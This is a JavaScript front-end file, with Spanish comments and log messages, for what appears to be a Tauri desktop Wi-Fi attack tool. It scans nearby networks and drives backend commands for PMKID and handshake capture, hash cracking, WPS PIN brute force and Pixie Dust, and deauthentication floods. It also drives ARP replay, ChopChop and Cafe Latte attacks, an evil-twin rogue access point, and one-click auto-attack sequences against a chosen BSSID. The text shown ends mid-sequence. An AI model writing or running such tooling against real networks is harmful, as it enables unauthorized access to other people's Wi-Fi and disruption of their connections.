import { invoke } from '@tauri-apps/api/core';
import { listen } from '@tauri-apps/api/event';

// ── State ────────────────────────────────────────────────────────────────
let activeTab = 'scan';
let logLines  = [];

// ── helpers ──────────────────────────────────────────────────────────────
const $  = id => document.getElementById(id);
const esc = s => String(s)
  .replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
window.esc = esc;

function el(tag, cls, html) {
  const e = document.createElement(tag);
  if (cls) e.className = cls;
  if (html !== undefined) e.innerHTML = html;
  return e;
}

// ── Log ──────────────────────────────────────────────────────────────────
function log(msg, level = 'info') {
  const now = new Date().toLocaleTimeString('es-ES', { hour12: false });
  const line = `[${now}] [${level.toUpperCase()}] ${msg}`;
  logLines.push(line);

  const cv = $('cv');
  if (cv) {
    cv.textContent += logLines.length === 1 ? line : '\n' + line;
    cv.scrollTop = cv.scrollHeight;
  }

  const mini = $('mini-cv');
  if (mini) {
    const lines = logLines.slice(-3).join('\n');
    mini.textContent = lines;
    mini.scrollTop = mini.scrollHeight;
  }

  console.log(line);
}
window.log = log;

window.clearConsole = function clearConsole() {
  logLines = [];
  $('cv').textContent = '';
  const mini = $('mini-cv');
  if (mini) mini.textContent = '';
};

// ── Row selection ────────────────────────────────────────────────────────────
window.selectNetwork = function (bssid, ssid, signal, channel, security) {
  if (!bssid) { log('Red sin BSSID, no se puede seleccionar.', 'warn'); return; }

  const bar = document.getElementById('scan-attack-bar');
  const sabSsid = document.getElementById('sab-ssid');
  const sabMeta = document.getElementById('sab-meta');
  if (bar) bar.style.display = 'flex';
  if (sabSsid) sabSsid.textContent = `${ssid || 'Red oculta'}`;
  if (sabMeta) sabMeta.textContent = `${bssid} · ${signal}% · CH ${channel} · ${security}`;

  const attackBssid = document.getElementById('attack-bssid');
  if (attackBssid) {
    const opt = Array.from(attackBssid.options).find(o => o.value === bssid);
    if (opt) opt.selected = true;
  }

  document.querySelectorAll('#net-tbody tr').forEach(r => r.classList.remove('selected'));
  try {
    const row = document.querySelector(`#net-tbody tr[data-bssid="${CSS.escape(bssid)}"]`);
    if (row) row.classList.add('selected');
  } catch (e) {
    log(`selectNetwork: error resaltando fila: ${e}`, 'error');
  }

  log(`Seleccionada: ${ssid || 'Red oculta'} (${bssid}) · ${signal}% · CH ${channel}`, 'info');

  const autoBssid = document.getElementById('auto-bssid');
  if (autoBssid) autoBssid.value = bssid;

  profileTarget(bssid);

  window.showTab('attack');
};

// ── Perfilador de objetivo (solo lectura) ─────────────────────────────────
const VERDICT_COLORS = {
  open: 'var(--green)', wep: 'var(--yellow)', wpa_legacy: 'var(--yellow)',
  wpa2_psk: 'var(--accent)', transition: 'var(--orange)', wpa3_sae: 'var(--red)',
  enterprise: 'var(--gray)', unknown: 'var(--gray)',
};
const BADGE_LABELS = {
  'windows-ok': '✓ Windows', 'linux-required': '⚠ requiere Linux',
  'exito-alto': 'éxito alto', 'exito-medio': 'éxito medio',
  'exito-bajo': 'éxito bajo', 'exito-nulo': 'sin vía',
};

async function profileTarget(bssid) {
  const box = document.getElementById('target-verdict');
  if (!bssid) { if (box) box.style.display = 'none'; return; }
  try {
    const p = await window.__invoke('profile_target', { bssid });
    window._profile = p;
    renderProfile(p);
  } catch (e) {
    log(`Perfilador: ${e}`, 'warn');
    if (box) box.style.display = 'none';
  }
}
window.profileTarget = profileTarget;

function renderProfile(p) {
  const box = document.getElementById('target-verdict');
  if (!box || !p) return;
  const color = VERDICT_COLORS[p.verdict] || 'var(--gray)';
  box.style.display = 'block';
  box.style.borderColor = color;
  document.getElementById('verdict-title').textContent = p.title;
  document.getElementById('verdict-title').style.color = color;
  document.getElementById('verdict-detail').textContent = p.detail;
  document.getElementById('verdict-meta').textContent =
    `${p.ssid} · ${p.bssid} · ${p.auth}/${p.cipher} · CH ${p.channel ?? '?'} · ${p.signal ?? '?'}% · WPS:${p.wps} · MFP:${p.mfp}`;
  const badges = document.getElementById('verdict-badges');
  badges.innerHTML = (p.badges || []).map(b =>
    `<span style="font-size:10.5px;font-weight:600;border:1px solid ${color}55;color:${color};border-radius:99px;padding:2px 10px">${esc(BADGE_LABELS[b] || b)}</span>`
  ).join('');
}

// ── Tabs ─────────────────────────────────────────────────────────────────
window.showTab = function (id) {
  try {
    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
    document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
    const tab  = $(`tab-${id}`);
    const nav  = $(`nav-${id}`);
    if (tab) tab.classList.add('active');
    else log(`showTab: no se encontró #tab-${id}`, 'error');
    if (nav) nav.classList.add('active');
    else log(`showTab: no se encontró #nav-${id}`, 'error');
    activeTab = id;
  } catch (e) {
    log(`showTab error: ${e}`, 'error');
  }
};

// ── Render rows ───────────────────────────────────────────────────────────
function sigChars(sig) {
  const c = Math.max(0, Math.min(100, sig));
  return c >= 75 ? '▂▄▆█'
       : c >= 50 ? '▂▄▆'
       : c >= 25 ? '▂▄'
       : '▁';
}

function sigColor(sig) {
  const c = Math.max(0, Math.min(100, sig));
  return `hsl(140, 70%, ${18 + c * 0.37}%)`;
}

function secColor(sec) {
  if (!sec || /abierta|open/i.test(sec)) return 'var(--gray)';
  return 'var(--accent)';
}

function rowsHtml(nets) {
  if (!nets.length) {
    return `
      <tr class="empty-row">
        <td colspan="6">
          <div class="empty-state">
            <span class="ei">&#128247;</span>
            <p>No se encontraron redes en este escaneo.</p>
          </div>
        </td>
      </tr>`;
  }

  return nets.map((n, i) => `
    <tr style="cursor:pointer"
        data-bssid="${esc(n.bssid || '')}"
        data-ssid="${esc(n.ssid)}"
        data-signal="${n.signal ?? 0}"
        data-channel="${n.channel ?? 0}"
        data-security="${esc(n.security || 'Abierta')}"
        data-index="${i}">
      <td class="td-bar" style="color:${sigColor(n.signal)}">${sigChars(n.signal)}</td>
      <td class="td-ssid" title="${esc(n.ssid)}">${esc(n.ssid)}</td>
      <td class="td-num" style="color:${sigColor(n.signal)};text-align:right">${n.signal}%</td>
      <td class="td-num" style="color:var(--muted);text-align:right">${n.channel ?? '–'}</td>
      <td><span class="sec-badge"
               style="background:${secColor(n.security)}22;color:${secColor(n.security)};
                      border:1px solid ${secColor(n.security)}55;padding:3px 10px;
                      border-radius:99px;font-size:11px;font-weight:600">
              ${esc(n.security || 'Abierta')}
            </span></td>
      <td class="td-bssid">${esc(n.bssid || '—')}</td>
    </tr>
  `).join('');
}

// ── Scan handler ──────────────────────────────────────────────────────────
window.doScan = async function () {
  const btn = $('scanBtn');
  btn.disabled = true;
  btn.textContent = 'Escaneando…';
  $('status-txt').textContent = 'Escaneando…';
  $('count-pill').style.display = 'none';
  log('Comando scan_wifi enviado al proceso Rust…', 'info');

  const t0 = performance.now();

  try {
    const result = await window.__invoke('scan_wifi');
    const ms = Math.round(performance.now() - t0);

    if (result?.error) {
      log(`ERROR: ${result.error}`, 'error');
      renderHeader(`Error · ${result.error}`);
      renderRows([]);
      $('status-txt').textContent = 'Error';
      return;
    }

    const nets = result?.networks || [];
    lastNets = [...nets];   // guarda para el panel de ataque
    syncTargetList();       // refresca el selector BSSID
    log(`Escaneo completado en ${ms} ms · ${nets.length} redes encontradas`, 'info');
    renderHeader(`${ms} ms · ${nets.length} red${nets.length === 1 ? '' : 'es'} encontrada${nets.length === 1 ? '' : 's'}`);
    renderRows(nets);
    $('status-txt').textContent = 'Listo';
    $('count-pill').style.display = 'inline';
  } catch (err) {
    const msg = String(err);
    log(`FATAL: ${msg}`, 'error');
    renderHeader('Error de conexión');
    renderRows([]);
  } finally {
    btn.disabled = false;
    btn.textContent = '&#8635; Escanear ahora';
  }
};

function renderHeader(text) {
  let pill = $('count-pill');
  if (!pill) return;
  pill.textContent = text;
  pill.style.display = 'inline';
}

function renderRows(nets) {
  $('net-tbody').innerHTML = rowsHtml(nets);
}

// Event delegation for row clicks (evita escapes rotos en onclick)
document.getElementById('net-tbody')?.addEventListener('click', function (e) {
  try {
    const tr = e.target.closest('tr');
    if (!tr || !tr.dataset.bssid) return;
    const bssid    = tr.dataset.bssid;
    const ssid     = tr.dataset.ssid || 'Red oculta';
    const signal   = parseInt(tr.dataset.signal) || 0;
    const channel  = parseInt(tr.dataset.channel) || 0;
    const security = tr.dataset.security || 'Abierta';
    selectNetwork(bssid, ssid, signal, channel, security);
  } catch (e) {
    log(`Error al seleccionar red: ${e}`, 'error');
  }
});

// ── Attack helpers: state & select ──────────────────────────────────────────
let lastNets = []; // last scan result — feeds attack BSSID dropdown

window.syncTargetList = function () {
  const sel = $('attack-bssid');
  if (!sel) return;
  sel.innerHTML = '<option value="">-- Selecciona una red de la lista --</option>';
  lastNets.forEach(n => {
    const opt   = document.createElement('option');
    opt.value   = n.bssid || '';
    opt.textContent = `${n.ssid}  ·  ${n.bssid || 'sin bssid'}  ·  ${n.security}`;
    sel.appendChild(opt);
  });
};

function getSelectedBssid() {
  const bssid = $('attack-bssid')?.value?.trim();
  if (!bssid) { log('Selecciona un objetivo BSSID en el panel Ataque primero.', 'warn'); return null; }
  return bssid;
}

function valOrEmpty(v) { return String(v ?? '').trim(); }

// Canal del objetivo seleccionado (del último scan). Como la radio Windows no
// salta de canal, los ataques deben lanzarse en el canal donde ya está el AP.
function selectedChannel() {
  try {
    const bssid = $('attack-bssid')?.value?.trim();
    if (!bssid) return undefined;
    const n = (typeof lastNets !== 'undefined' ? lastNets : []).find(
      x => (x.bssid || '').toUpperCase() === bssid.toUpperCase());
    const ch = n ? parseInt(n.channel) : NaN;
    if (ch >= 1 && ch <= 165) {
      log(`Canal objetivo auto: CH${ch} (del scan).`, 'info');
      return ch;
    }
  } catch (e) { /* sin scan: manual */ }
  return undefined;
}

// ── Attack invocations ──────────────────────────────────────────────────────
window.capturePmkid = async function () {
  const bssid = getSelectedBssid(); if (!bssid) return;
  const chRaw = valOrEmpty($('pmkid-chan').value);
  const ch    = chRaw ? parseInt(chRaw) : selectedChannel();
  const dur   = $('pmkid-dur').value ? parseInt($('pmkid-dur').value) : 120;
  currentAttackId = `pmkid_${bssid.replace(/:/g,'')}`;
  showProgress(true);
  updateProgress(10, 'Iniciando PMKID capture...');
  return invokeAttack('pmkid_capture_bg', { bssid, channel: ch, durationSeconds: dur });
};

window.captureNative = async function () {
  const iface = valOrEmpty($('pmkid-iface').value) || undefined;
  const dur = $('pmkid-dur').value ? parseInt($('pmkid-dur').value) : 30;
  if (!iface) { log('Indica el GUID NPF_{…} en Interfaz (modal «Activar modo monitor»).', 'warn'); return; }
  log(`>>> Rust invoke → native_capture (bloquea ~${dur}s, modo monitor requerido)…`, 'info');
  try {
    const r = await window.__invoke('native_capture', { ifaceGuid: iface, durationSecs: dur });
    log(r.message || JSON.stringify(r), r.success ? 'ok' : 'error');
    if (r.success && r.output_file) {
      log(`Convierte con: pcap_to_22000 ← ${r.output_file}`, 'info');
      const conv = $('convert-native-pcap');
      if (conv) conv.value = r.output_file;
    }
  } catch (err) {
    log(`[FATAL native_capture] ${err}`, 'error');
  }
};

window.convertPmkid = async function () {
  const pcap = valOrEmpty($('convert-pcap').value);
  if (!pcap) { log('Especifica el archivo .pcapng a convertir.', 'warn'); return; }
  return invokeAttack('pmkid_convert', { pcapngPath: pcap, outputDir: undefined });
};

window.convertPmkidNative = async function () {
  const pcap = valOrEmpty($('convert-native-pcap').value);
  const out  = valOrEmpty($('convert-native-outdir').value) || undefined;
  if (!pcap) { log('Especifica el archivo .pcapng a convertir (nativo).', 'warn'); return; }
  return invokeAttack('pcap_to_22000', { pcapPath: pcap, outputDir: out || undefined });
};

window.crackPmkid = async function () {
  const hash = valOrEmpty($('crack-hash').value);
  const wl   = valOrEmpty($('crack-wordlist').value);
  if (!hash) { log('Especifica el archivo .22000 a crackear.', 'warn'); return; }
  return invokeAttack('pmkid_crack', {
    hashFile: hash,
    wordlist:  wl || undefined,
    attackMode: undefined,
  });
};

window.wpsBrute = async function () {
  const bssid = getSelectedBssid(); if (!bssid) return;
  const iface = valOrEmpty($('wps-iface').value) || 'wlan0';
  const toolEl = $('wps-tool');
  const tool = (toolEl && valOrEmpty(toolEl.value)) || 'auto';
  const chEl = $('wps-chan');
  const chRaw = (chEl && valOrEmpty(chEl.value)) || '';
  const ch = chRaw ? parseInt(chRaw) : selectedChannel();
  if (tool === 'bully') {
    try {
      const c = await window.__invoke('check_tool', { name: 'bully.exe' });
      if (!c.success) { log('bully.exe no encontrado (opcional). Fallback a reaver.exe.', 'warn'); }
    } catch (e) { log('check bully: ' + e, 'warn'); }
  }
  showProgress(true);
  if (tool === 'wsl') {
    updateProgress(10, 'Iniciando WPS bruteforce en Kali-WSL2 (reaver)...');
    currentAttackId = `wpswsl_${bssid.replace(/:/g,'')}`;
    try {
      const r = await window.__invoke('wsl_reaver', { iface: 'wlan0', bssid, channel: ch || 11, durationSecs: 60, pixie: false });
      if (r.stdout) log(r.stdout, 'ok');
      if (r.stderr) log(r.stderr, r.success ? 'info' : 'warn');
      log(`[Kali reaver ${r.success ? 'OK' : 'ERROR'}] ${r.message}`, r.success ? 'ok' : 'error');
    } catch (e) { log('[Kali reaver] FATAL: ' + e, 'error'); }
    showProgress(false);
    return;
  }
  updateProgress(10, 'Iniciando WPS bruteforce (reaver por defecto, bully opcional)...');
  if (tool === 'reaver' || tool === 'auto') {
    currentAttackId = `wpsr_${bssid.replace(/:/g,'')}`;
    return invokeAttack('wps_bruteforce_reaver_bg', { bssid, iface, channel: ch });
  }
  currentAttackId = `wps_${bssid.replace(/:/g,'')}`;
  return invokeAttack('wps_pin_bruteforce_bg', { bssid, interface: iface, channel: ch });
};

window.doWashScan = async function () {
  const ifaceEl = $('wash-iface') || $('wps-iface');
  const iface = (ifaceEl && valOrEmpty(ifaceEl.value)) || 'wlan0';
  const chEl = $('wash-chan');
  const chRaw = (chEl && valOrEmpty(chEl.value)) || '';
  const ch = chRaw ? parseInt(chRaw) : undefined;
  currentAttackId = 'wash_scan';
  showProgress(true);
  updateProgress(10, 'Wash scan WPS...');
  try {
    const r = await window.__invoke('wash_scan', { iface, channel: ch });
    const n = (r.entries && r.entries.length) || 0;
    log('Wash: ' + n + ' redes WPS.', 'ok');
    (r.entries || []).forEach(function(e) { log(' ' + e.bssid + ' CH' + (e.channel || '?') + ' ' + (e.wpsLocked ? 'LOCKED' : 'open') + ' ' + (e.essid || ''), e.wpsLocked ? 'warn' : 'info'); });
    log(r.output, 'output');
  } catch (e) { log('Wash ERROR: ' + e, 'error'); }
};

window.captureHandshake = async function () {
  const bssid = getSelectedBssid(); if (!bssid) return;
  const essid = valOrEmpty($('handshake-essid').value) || undefined;
  const chRaw = valOrEmpty($('handshake-chan').value);
  const ch    = chRaw ? parseInt(chRaw) : selectedChannel();
  const dur   = $('handshake-dur').value ? parseInt($('handshake-dur').value) : 60;
  currentAttackId = `handshake_${bssid.replace(/:/g,'')}`;
  showProgress(true);
  updateProgress(10, 'Iniciando handshake capture...');
  return invokeAttack('capture_handshake_bg', { bssid, essid, channel: ch, durationSeconds: dur });
};

window.crackHandshake = async function () {
  const hash  = valOrEmpty($('crack-handshake-hash').value);
  const wl    = valOrEmpty($('crack-handshake-wordlist').value);
  const atk   = valOrEmpty($('crack-handshake-mode').value) || '0';
  const sess  = valOrEmpty($('crack-handshake-session').value) || undefined;
  if (!hash) { log('Especifica el archivo .hccapx o .22000 a crackear.', 'warn'); return; }
  return invokeAttack('crack_handshake', {
    hashFile: hash,
    wordlist:  wl || undefined,
    attackMode: parseInt(atk) || undefined,
    sessionName: sess || undefined,
  });
};

window.doDeauth = async function () {
  const bssid  = valOrEmpty($('deauth-bssid').value);
  const client = valOrEmpty($('deauth-client').value) || undefined;
  const cnt    = valOrEmpty($('deauth-count').value) || '10';
  const iface  = valOrEmpty($('deauth-iface').value) || 'wlan0mon';

  if (!bssid) { log('Especifica el BSSID del AP objetivo.', 'warn'); return; }
  log(`Deauth: AP=${bssid} client=${client || 'broadcast'} cnt=${cnt} iface=${iface}`, 'warn');
  return invokeAttack('deauth_inject', { bssid, clientMac: client, count: parseInt(cnt) || 10, iface });
};

window.doDisassoc = async function () {
  const bssid  = valOrEmpty($('deauth-bssid').value);
  const client = valOrEmpty($('deauth-client').value) || undefined;
  const cnt    = valOrEmpty($('deauth-count').value) || '5';
  const iface  = valOrEmpty($('deauth-iface').value) || 'wlan0mon';

  if (!bssid) { log('Especifica el BSSID del AP objetivo.', 'warn'); return; }
  log(`Disassoc: AP=${bssid} client=${client || 'broadcast'} cnt=${cnt} iface=${iface}`, 'warn');
  return invokeAttack('disassoc_inject', { bssid, clientMac: client, count: parseInt(cnt) || 5, iface });
};

window.doBeaconFlood = async function () {
  const essid = valOrEmpty($('beacon-essid').value);
  const ch    = valOrEmpty($('beacon-chan').value) || '1';
  const cnt   = valOrEmpty($('beacon-count').value) || '50';
  const iface = valOrEmpty($('beacon-iface').value) || undefined;
  if (!essid) { log('Especifica un ESSID para el beacon flood.', 'warn'); return; }
  log(`Beacon flood: ESSID=${essid} chan=${ch} beacons=${cnt} iface=${iface || 'auto'}`, 'warn');
  return invokeAttack('beacon_flood', { essid, bssid: undefined, channel: parseInt(ch) || 1, beaconCount: parseInt(cnt) || 50, iface });
};

window.doAirodumpScan = async function () {
  const chRaw   = valOrEmpty($('airodump-chan').value);
  const ch      = chRaw ? parseInt(chRaw) : 0;
  const dur     = valOrEmpty($('airodump-dur').value) ? parseInt($('airodump-dur').value) : 60;
  const bssid   = valOrEmpty($('airodump-bssid').value) || undefined;
  const iface   = valOrEmpty($('airodump-iface').value) || undefined;
  log(`airodump: ch=${ch || 'todos'} dur=${dur}s bssid=${bssid || 'ninguno'} iface=${iface || 'auto'}`, 'info');
  currentAttackId = 'airodump_scan';
  showProgress(true);
  updateProgress(10, 'Iniciando escaneo airodump...');
  return invokeAttack('scan_airodump_bg', { bssidFilter: bssid, channelFilter: ch || undefined, durationSecs: dur, iface });
};

window.doArpreply = async function () {
  const bssid = valOrEmpty($('arpreply-bssid').value);
  const mac   = valOrEmpty($('arpreply-mac').value) || 'ff:ff:ff:ff:ff:ff';
  const iface = valOrEmpty($('arpreply-iface').value) || 'wlan0mon';
  if (!bssid) { log('Especifica el BSSID del AP objetivo.', 'warn'); return; }
  log(`ARP Replay: AP=${bssid} mac=${mac} iface=${iface}`, 'warn');
  return invokeAttack('arp_replay_inject', { targetBssid: bssid, address: mac, iface });
};

window.doWpsPbc = async function () {
  const bssid = valOrEmpty($('wpspbc-bssid').value);
  const iface = valOrEmpty($('wpspbc-iface').value) || 'wlan0';
  const chEl = $('wpspbc-chan');
  const chRaw = (chEl && valOrEmpty(chEl.value)) || '';
  const channel = chRaw ? parseInt(chRaw) : selectedChannel();
  if (!bssid) { log('Especifica el BSSID del AP objetivo.', 'warn'); return; }
  log(`WPS PBC: BSSID=${bssid} iface=${iface}`, 'warn');
  currentAttackId = `wpspbc_${bssid.replace(/:/g,'')}`;
  showProgress(true);
  return invokeAttack('wps_pbc_attack_bg', { bssid, iface, channel });
};

window.doChopChop = async function () {
  const bssid    = valOrEmpty($('chopchop-bssid').value);
  const srcMac   = valOrEmpty($('chopchop-mac').value) || undefined;
  const iface    = valOrEmpty($('chopchop-iface').value) || 'wlan0mon';
  if (!bssid) { log('Especifica el BSSID del AP objetivo.', 'warn'); return; }
  log(`ChopChop: AP=${bssid} src=${srcMac || '00:11:22:33:44:55'} iface=${iface}`, 'warn');
  return invokeAttack('chopchop_inject', { targetBssid: bssid, sourceMac: srcMac, iface });
};

window.doRogueAp = async function () {
  const essid  = valOrEmpty($('rogue-essid').value);
  const bssid  = valOrEmpty($('rogue-bssid').value) || undefined;
  const ch     = valOrEmpty($('rogue-chan').value) || '1';
  const iface  = valOrEmpty($('rogue-iface').value) || 'wlan0mon';
  if (!essid) { log('Especifica el ESSID del AP falso.', 'warn'); return; }
  log(`Evil Twin: ESSID=${essid} BSSID=${bssid || '00:11:22:33:44:55'} chan=${ch} iface=${iface}`, 'warn');
  return invokeAttack('rogue_ap', { essid, bssid, channel: parseInt(ch) || 1, iface });
};

// Wrapper usado por los botones onclick="doCmd('name', handler)"
window.doCmd = function (cmdName, handler) {
  log(`>>> [${cmdName}] ejecutando…`, 'info');
  try {
    const result = handler();
    if (result instanceof Promise) {
      result.catch(err => log(`[${cmdName}] error: ${err}`, 'error'));
    }
    return result;
  } catch (err) {
    log(`[${cmdName}] error: ${err}`, 'error');
  }
};

async function invokeAttack(cmd, args) {
  log(`>>> Rust invoke → ${cmd}  args=${JSON.stringify(args)}`, 'info');
  const t0 = performance.now();
  try {
    const result = await window.__invoke(cmd, args);
    const ms   = Math.round(performance.now() - t0);
    const out  = result?.output || '';

    if (result?.error) {
      log(`[ERROR ${cmd}] ${result.error}`, 'error');
      return;
    }
    if (out) {
      const lines = out.split('\n');
      const head  = lines.slice(0, 80).join('\n');
      if (lines.length > 80) {
        log(`[${cmd}] — ${lines.length} líneas de salida. Primeras 80:\n${head}\n...`, 'output');
      } else {
        log(`[${cmd}]:\n${out}`, 'output');
      }
    }
    if (result?.success) {
      log(`✅ ${cmd} completado en ${ms} ms`, 'ok');
    } else {
      log(`⚠️  ${cmd} finalizó (code=${result?.exit_code ?? '?'}) en ${ms} ms`, 'warn');
    }
  } catch (err) {
    log(`[FATAL ${cmd}] ${err}`, 'error');
  }
}

// ── Tools detection ─────────────────────────────────────────────────────────
window.checkToolsStatus = async function () {
  const body = $('tools-status-body');
  if (!body) return;
  body.innerHTML = '<p style="font-size:11.5px;color:var(--muted)">Escaneando binarios…</p>';

  try {
    const result = await window.__invoke('detect_tools');
    const tools = result?.tools || [];
    const ready = result?.ready_count || 0;
    const total  = result?.total || tools.length;

    if (tools.length === 0) {
      body.innerHTML = '<p style="font-size:11.5px;color:var(--red)">No se pudo consultar el estado de herramientas.</p>';
      return;
    }

    let html = '';
    for (const t of tools) {
      const dotClass = t.found ? 'ok' : 'miss';
      const name     = t.found ? t.name : `${t.name}`;
      const path     = t.found ? t.full_path : t.install_hint || 'no encontrado';
      const ver      = t.version;
      html += `<div class="tool-row">
        <span class="tool-dot ${dotClass}"></span>
        <span class="tool-name">${esc(t.name)}</span>
        <span class="tool-path" title="${esc(path)}">${esc(path)}</span>
        <span class="tool-ver">${esc(ver)}</span>
      </div>`;
    }

    const summary = `<p style="font-size:11px;color:${ready === total ? 'var(--green)' : 'var(--orange)'};margin-top:4px">
      ${ready}/${total} herramientas listas ${ready === total ? '✅' : '⚠️ algunas faltan'}
    </p>`;

    body.innerHTML = html + summary;
    log(`Detectadas ${ready}/${total} herramientas listas.${ready < total ? ' Instala las faltantes con los hints mostrados.' : ''}`, ready < total ? 'warn' : 'ok');
  } catch (err) {
    body.innerHTML = `<p style="font-size:11.5px;color:var(--red)">Error consultando herramientas: ${esc(err)}</p>`;
    log(`[detect_tools] ERROR: ${err}`, 'error');
  }
};

window.findTool = async function (name) {
  if (!name) return;
  log(`>>> Buscando herramienta: ${name}`, 'info');
  try {
    const result = await window.__invoke('find_tool_cmd', { name });
    log(result.success ? `✅ ${result.output}` : `❌ ${result.output}`, result.success ? 'ok' : 'error');
  } catch (err) {
    log(`[find_tool] FATAL: ${err}`, 'error');
  }
};

// ── Interface status handler ──────────────────────────────────────────────────
window.doIfaceStatus = async function () {
  log('Obteniendo información del adaptador…', 'info');
  try {
    const result = await window.__invoke('wifi_interface_status');
    log(result?.output || JSON.stringify(result), 'info');
  } catch (err) {
    log(`[wifi_interface_status] ERROR: ${err}`, 'error');
  }
};

// ── List processes handler ────────────────────────────────────────────────────
window.doListProcs = async function () {
  log('Listando procesos de ataque…', 'info');
  try {
    const result = await window.__invoke('list_attack_processes');
    const out = result?.output || JSON.stringify(result) || 'No hay procesos activos.';
    log(out, 'info');
  } catch (err) {
    log(`[list_attack_processes] ERROR: ${err}`, 'error');
  }
};

// ── Init ─────────────────────────────────────────────────────────────────────
window.showTab('scan');

// Auto-scan con manejo de errores - no bloquea el inicio
setTimeout(async () => {
    try {
        await window.doScan();
    } catch (e) {
        console.error('Auto-scan falló:', e);
    }
    try {
        await window.loadCrackAssets();
    } catch (e) {
        console.error('Crack assets falló:', e);
    }
}, 600);// AUTO-ATTACK MAESTRO
// Ejecuta todos los ataques disponibles en secuencia contra un objetivo

window.autoAttack = async function () {
  const bssid = getSelectedBssid();
  if (!bssid) return;
  const clean = bssid.replace(/:/g, '');

  log('========================================', 'warn');
  log('  AUTO-ATTACK: Secuencia completa', 'warn');
  log('  Objetivo: ' + bssid, 'warn');
  log('========================================', 'warn');

  const autoCh = selectedChannel();

  const steps = [
    { name: '1/5 - PMKID Capture', cmd: 'pmkid_capture_bg', args: { bssid, channel: autoCh, durationSeconds: 60 }, bgId: `pmkid_${clean}` },
    { name: '2/5 - Handshake Capture', cmd: 'capture_handshake_bg', args: { bssid, essid: undefined, channel: autoCh, durationSeconds: 120 }, bgId: `handshake_${clean}` },
    { name: '3/5 - WPS Pixie Dust', cmd: 'wps_pixiedust_bg', args: { bssid, iface: undefined, channel: autoCh }, bgId: `wpspix_${clean}` },
    { name: '4/5 - WPS PIN Bruteforce', cmd: 'wps_bruteforce_reaver_bg', args: { bssid, iface: undefined, channel: autoCh }, bgId: `wpsr_${clean}` },
    { name: '5/5 - Deauth + Disassoc', cmd: 'deauth_inject', args: { bssid, clientMac: undefined, count: 5, iface: undefined }, bgId: null },
  ];

  window._autoStop = false;
  showProgress(true);
  for (const step of steps) {
    if (window._autoStop) { log('Auto-attack cancelado por el usuario.', 'warn'); break; }
    const btn = document.getElementById('autoAttackBtn');
    if (btn) btn.textContent = step.name;
    updateProgress(10 + Math.round(80 * steps.indexOf(step) / steps.length), step.name);
    log('[' + (steps.indexOf(step)+1) + '/' + steps.length + '] ' + step.name + '...', 'warn');
    currentAttackId = step.bgId; // cancelable con ■ Cancelar
    await invokeAttack(step.cmd, step.args);
  }
  currentAttackId = null;
  showProgress(false);
  window._autoStop = false;

  log('========================================', 'ok');
  log('  AUTO-ATTACK COMPLETADO', 'ok');
  log('========================================', 'ok');
  const btn2 = document.getElementById('autoAttackBtn');
  if (btn2) btn2.textContent = 'Auto-Attack';
};


// QUICK ATTACK - ataque rapido directo
window.quickAttack = function (type) {
  const bssid = getSelectedBssid();
  if (!bssid) return;
  if (type === 'pmkid') {
    log('Quick attack: PMKID capture en ' + bssid, 'warn');
    return invokeAttack('pmkid_capture', { bssid, channel: selectedChannel(), durationSeconds: 60 });
  }
  if (type === 'deauth') {
    log('Quick attack: Deauth en ' + bssid, 'warn');
    return invokeAttack('deauth_inject', { bssid, clientMac: undefined, count: 5, iface: undefined });
  }
};

// Clear selection
window.clearSelection = function () {
  const sel = document.getElementById('attack-bssid');
  if (sel) sel.value = '';
  const auto = document.getElementById('auto-bssid');
  if (auto) auto.value = '';
  log('Seleccion limpiada', 'info');
};

// WPS Pixie Dust
window.doWpsPixieDust = async function () {
  const bssid = valOrEmpty(document.getElementById('pixie-bssid').value);
  const iface = valOrEmpty(document.getElementById('pixie-iface').value) || undefined;
  const chEl = document.getElementById('pixie-chan');
  const chRaw = chEl ? valOrEmpty(chEl.value) : '';
  const channel = chRaw ? parseInt(chRaw) : selectedChannel();
  if (!bssid) { log('Especifica el BSSID del AP.', 'warn'); return; }
  currentAttackId = `wpspix_${bssid.replace(/:/g,'')}`;
  showProgress(true);
  return invokeAttack('wps_pixiedust_bg', { bssid, iface, channel });
};

// Fragment Injection
window.doFragment = async function () {
  const bssid = valOrEmpty(document.getElementById('frag-bssid').value);
  const iface = valOrEmpty(document.getElementById('frag-iface').value) || undefined;
  if (!bssid) { log('Especifica el BSSID del AP.', 'warn'); return; }
  return invokeAttack('fragment_inject', { bssid, iface });
};

// Cafe Latte
window.doCafeLatte = async function () {
  const bssid = valOrEmpty(document.getElementById('latte-bssid').value);
  const mac   = valOrEmpty(document.getElementById('latte-mac').value);
  const iface = valOrEmpty(document.getElementById('latte-iface').value) || undefined;
  if (!bssid || !mac) { log('Especifica BSSID y MAC del cliente.', 'warn'); return; }
  return invokeAttack('cafe_latte_attack', { bssid, clientMac: mac, iface });
};

// Interactive Inject
window.doInteractive = async function () {
  const iface = valOrEmpty($('inter-iface').value) || undefined;
  return invokeAttack('interactive_inject', { iface });
};

// Auto-attack maestro 8 pasos
window.startAutoAttack = async function () {
  const bssid = getSelectedBssid();
  if (!bssid) return;
  const wordlist = valOrEmpty(document.getElementById('auto-wordlist').value) || undefined;
  const iface    = valOrEmpty(document.getElementById('auto-iface').value) || undefined;

  log('==============================', 'warn');
  log(' AUTO-ATTACK 8 PASOS INICIADO', 'warn');
  log(' Objetivo: ' + bssid, 'warn');
  log(' Wordlist: ' + (wordlist || 'por defecto'), 'warn');
  log('==============================', 'warn');

  const autoCh9 = selectedChannel();
  const clean9 = bssid.replace(/:/g, '');

  const steps = [
    { n: '1/9 - Deauth ligero', cmd: 'deauth_inject', args: { bssid, clientMac: undefined, count: 3, iface }, bgId: null },
    { n: '2/9 - Capturar PMKID', cmd: 'pmkid_capture_bg', args: { bssid, channel: autoCh9, durationSeconds: 60 }, bgId: `pmkid_${clean9}` },
    { n: '3/9 - Deauth fuerte', cmd: 'deauth_inject', args: { bssid, clientMac: undefined, count: 10, iface }, bgId: null },
    { n: '4/9 - Capturar Handshake', cmd: 'capture_handshake_bg', args: { bssid, essid: undefined, channel: autoCh9, durationSeconds: 120 }, bgId: `handshake_${clean9}` },
    { n: '5/9 - WPS Pixie Dust', cmd: 'wps_pixiedust_bg', args: { bssid, iface, channel: autoCh9 }, bgId: `wpspix_${clean9}` },
    { n: '6/9 - WPS PIN Bruteforce', cmd: 'wps_bruteforce_reaver_bg', args: { bssid, iface, channel: autoCh9 }, bgId: `wpsr_${clean9}` },
